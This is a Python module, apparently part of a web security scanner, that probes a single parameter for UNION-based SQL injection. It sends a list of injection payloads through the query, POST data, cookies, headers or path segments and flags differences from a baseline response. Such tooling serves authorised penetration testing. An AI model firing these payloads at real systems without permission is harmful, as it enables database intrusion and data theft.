import re
import urllib.parse
from ..utils import send_request

from .. import diff

ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]

PAYLOADS = [
    "' UNION SELECT NULL-- ",
    "' UNION SELECT NULL,NULL-- ",
    "' UNION SELECT NULL,NULL,NULL-- ",
    '" UNION SELECT NULL-- ',
    '" UNION SELECT NULL,NULL-- ',
    '" UNION SELECT NULL,NULL,NULL-- ',
]


def fetch(
    url: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
) -> str:
    """Fetch a URL using the given HTTP method and return the body."""
    return send_request(url, method=method, data=data, cookies=cookies, headers=headers)


def test_parameter(
    url: str,
    param: str,
    value: str,
    method: str = "get",
    data: dict | None = None,
    cookies: dict | None = None,
    headers: dict | None = None,
    location: str = "query",
    path_index: int | None = None,
):
    """Attempt UNION-based SQL injection on a single parameter."""
    data = data or {}
    cookies = cookies or {}
    headers = headers or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception as e:
            baseline_body = str(e)
    elif location == "header":
        original = headers.get(param, "")
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception as e:
            baseline_body = str(e)
    elif location == "path" and path_index is not None:
        segments = parsed.path.split("/")
        original = segments[path_index]
        try:
            baseline_body = fetch(
                url,
                method=method,
                data=data if method.lower() == "post" else None,
                cookies=cookies,
                headers=headers,
            )
        except Exception as e:
            baseline_body = str(e)
    elif method.lower() == "get":
        original = query.get(param, [''])[0]
        try:
            baseline_body = fetch(url, cookies=cookies, headers=headers)
        except Exception as e:
            baseline_body = str(e)
    else:
        original = data.get(param, "")
        try:
            baseline_body = fetch(url, method="post", data=data, cookies=cookies)
        except Exception as e:
            baseline_body = str(e)

    results = []
    for payload in PAYLOADS:
        if location == "cookie":
            new_cookies = cookies.copy()
            new_cookies[param] = original + payload
            new_url = url
            try:
                body = fetch(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=new_cookies,
                    headers=headers,
                )
            except Exception as e:
                body = str(e)
        elif location == "header":
            new_headers = headers.copy()
            new_headers[param] = original + payload
            new_url = url
            try:
                body = fetch(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=cookies,
                    headers=new_headers,
                )
            except Exception as e:
                body = str(e)
        elif location == "path" and path_index is not None:
            segments = parsed.path.split("/")
            segments[path_index] = original + payload
            new_path = "/".join(segments)
            new_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            try:
                body = fetch(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=cookies,
                    headers=headers,
                )
            except Exception as e:
                body = str(e)
        elif method.lower() == "get":
            query[param] = original + payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            try:
                body = fetch(new_url, cookies=cookies, headers=headers)
            except Exception as e:
                body = str(e)
        else:
            post_data = data.copy()
            post_data[param] = original + payload
            new_url = url
            try:
                body = fetch(new_url, method="post", data=post_data, cookies=cookies, headers=headers)
            except Exception as e:
                body = str(e)
        error = any(p.search(body) for p in ERROR_PATTERNS)
        diff_found = diff.is_significant_diff(baseline_body, body)
        vulnerable = diff_found and not error
        results.append({
            'url': new_url,
            'param': param,
            'payload': payload,
            'vulnerable': vulnerable,
        })
    return results
